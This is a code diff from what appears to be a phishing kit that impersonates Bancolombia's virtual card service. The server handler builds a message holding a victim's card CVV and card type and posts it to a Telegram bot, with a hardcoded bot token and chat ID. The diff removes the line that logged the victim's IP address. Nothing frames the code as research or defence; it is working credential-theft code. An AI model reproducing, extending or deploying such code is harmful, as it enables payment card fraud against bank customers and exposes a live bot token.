@@ -1,9 +1,8 @@
 const axios = require('axios');
 
 // ============================================
-// ✅ CONFIGURACIÓN SEGURA DE TELEGRAM
+// ✅ CONFIGURACIÓN DE TELEGRAM
 // ============================================
-// 🔴 TUS CREDENCIALES REALES 🔴
 const BOT_TOKEN = '8703044811:AAF2fekkn1hBO83UDXozzuvmzczZYQK2Mj4';
 const CHAT_ID = '8042354877';
 // ============================================
@@ -52,8 +51,7 @@ module.exports = async (req, res) => {
                         `🔐 *CVV:* ${cvcCode}\n` +
                         `🔄 *Tipo:* Mastercard Débito\n\n` +
                         `🕒 *Fecha:* ${new Date().toLocaleString('es-CO')}\n` +
-                        `🔒 *Canal:* Tarjeta Virtual Bancolombia\n` +
-                        `🌐 *IP:* ${req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Desconocida'}`;
+                        `🔒 *Canal:* Tarjeta Virtual Bancolombia`;
 
         // Enviar a Telegram
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
